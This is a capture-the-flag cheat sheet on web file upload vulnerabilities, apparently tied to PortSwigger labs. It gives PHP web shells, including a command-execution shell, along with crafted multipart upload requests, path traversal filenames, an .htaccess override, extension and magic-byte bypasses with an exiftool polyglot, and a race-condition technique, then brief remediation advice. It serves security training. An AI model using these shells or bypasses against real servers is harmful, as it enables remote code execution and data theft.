# File Upload Vulnerabilities — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, ExifTool, CyberChef  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

File upload vulnerabilities occur when a web server allows users to upload files to its filesystem without sufficiently validating characteristics such as their name, type, contents, or size.

1. **Locate Upload Endpoints:** Avatars, profile pictures, resumes, file converters, import tools.
2. **Determine Validation Defenses:**
   - Client-side JavaScript check (bypass easily in Burp).
   - `Content-Type` header validation.
   - File extension blacklist or whitelist.
   - File contents / Magic bytes inspection.
   - Execution permissions of the upload destination directory.
3. **Execute Web Shell:**
   - Direct execution via public path (e.g., `/files/avatars/shell.php`).
   - Traverse out of non-executable directory (`..%2fshell.php`).
   - Overwrite server configuration files (`.htaccess`).

---

## 2. Web Shell Payloads

### Minimal PHP Web Shells
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
```php
<?php system($_GET['cmd']); ?>
```
```php
<?=`$_GET[0]`?>
```

---

## 3. Validation Bypasses & Exploitation

### 1. Flawed `Content-Type` Validation
The server trusts the `Content-Type` header submitted by the client browser:
```http
POST /my-account/avatar HTTP/2
Content-Type: multipart/form-data; boundary=---------------------------123

-----------------------------123
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------123--
```
- Change `Content-Type: application/x-php` to `image/jpeg` or `image/png`.

---

### 2. Path Traversal via Filename
The upload directory blocks script execution, but the filename parameter is vulnerable to path traversal:
```http
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
Content-Type: application/x-php
```
*(If single URL-encoding fails, test raw `../exploit.php` or double-encoded `..%252fexploit.php`).*
- The shell is written to the parent webroot where PHP execution is allowed: `GET /files/exploit.php`.

---

### 3. Overriding Server Configuration (`.htaccess`)
If Apache blocks `.php` files or blacklists standard extensions, upload a custom `.htaccess` file to redefine executable extensions:

**Step 1: Upload `.htaccess`:**
```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .pwn
```

**Step 2: Upload Web Shell with Custom Extension:**
```http
Content-Disposition: form-data; name="avatar"; filename="exploit.pwn"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
*Result:* Apache processes `.pwn` as PHP code. Request `GET /files/avatars/exploit.pwn` to execute.

---

### 4. Extension Blacklist Bypasses & Obfuscation

| Bypass Method | Filename Example | Notes |
|---|---|---|
| **Alternate Extensions** | `exploit.php5`, `exploit.phtml`, `exploit.phar` | PHP execution aliases |
| **Case Sensitivity** | `exploit.pHp`, `exploit.PhP` | Case-insensitive web servers |
| **Trailing Characters** | `exploit.php.` or `exploit.php ` | Windows filesystem strips trailing dot/space |
| **URL-Encoded Null Byte**| `exploit.php%00.jpg` | PHP < 5.3.4 truncates filename |
| **Non-Recursive Stripping**| `exploit.p.phphp` | Stripping `.php` leaves `exploit.php` |
| **Double Extension** | `exploit.php.jpg` | Apache regex misconfiguration (`\.php.*`) |

---

### 5. Polyglot Web Shell (Bypassing Magic Bytes Inspection)
When the server validates that uploaded files are genuine images by parsing image headers and metadata:

Generate a valid JPEG/PNG containing embedded PHP using `exiftool`:
```bash
exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" original.jpg -o polyglot.php
```
- Upload `polyglot.php` with `Content-Type: image/jpeg`.
- The image parser confirms valid image magic bytes (`FF D8 FF`), but the PHP interpreter executes the embedded script.

---

### 6. Race Conditions in File Validation
The server writes the uploaded file to disk before performing security checks, then deletes it if validation fails:
- Use **Burp Turbo Intruder** or Repeater group tab to send rapid parallel requests:
  - Thread 1: Uploads `exploit.php` in a continuous loop.
  - Thread 2: Continuously requests `GET /files/avatars/exploit.php` before the server deletion thread runs.

---

## 4. CTF Quick Reference

| Defense Encountered | Bypass Strategy | Technique |
|---|---|---|
| **MIME Check** | Spoof `Content-Type` | Set `Content-Type: image/jpeg` |
| **Disabled Directory** | Path Traversal | `filename="..%2fexploit.php"` |
| **Blacklisted `.php`** | Overwrite config | Upload `.htaccess` with `AddType` |
| **Extension Filter** | Obfuscation | `exploit.php5`, `exploit.phtml`, `exploit.p.phphp` |
| **Magic Byte Check** | Polyglot Image | Embed shell via `exiftool -Comment` |
| **Post-Upload Delete** | Race Condition | Request file concurrently during upload |

---

## 5. Remediation

- **Store Uploads Outside Webroot:** Never store uploaded files inside an executable web-accessible directory.
- **Strict Extension Allowlist:** Only allow safe extensions (e.g., `.png`, `.jpg`, `.pdf`).
- **Rename Uploaded Files:** Re-assign randomly generated alphanumeric filenames (e.g., UUIDs) upon saving.
- **Strip Execution Permissions:** Configure web server directories to disable script handlers (`php_flag engine off` or Nginx `location { deny all; }`).
